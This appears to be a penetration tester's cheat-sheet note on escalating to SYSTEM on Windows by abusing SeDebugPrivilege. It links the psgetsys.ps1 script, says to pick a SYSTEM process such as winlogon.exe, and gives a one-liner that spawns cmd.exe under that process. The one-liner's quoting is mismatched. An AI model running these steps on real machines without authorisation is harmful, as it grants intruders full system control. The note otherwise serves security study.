# SeDebug Privilege RCE: getsys.ps1

OS: Windows
Description: SeDebug Privilege RCE
Security Domains: Privilege Escalation (https://www.notion.so/Privilege-Escalation-1444c8e523768043add9c30147563fd8?pvs=21)
Target_Technology: PowerShell (https://www.notion.so/PowerShell-1434c8e52376805dba60efbabdb026bf?pvs=21)

### SeDebug RCE

- getsys.ps1 script

```jsx
https://raw.githubusercontent.com/decoder-it/psgetsystem/master/psgetsys.ps1
```

- Run tasklist and target a PID running as system (winlogon.exe)

![Untitled](SeDebug%20Privilege%20RCE%20getsys%20ps1/Untitled.png)

-Run it using the PID

```jsx
.\psgetsys.ps1; [MyProcess]::CreateProcessFromParent(PID, 'c:\Windows\System32\cmd.exe","")
```

![Untitled](SeDebug%20Privilege%20RCE%20getsys%20ps1/Untitled%201.png)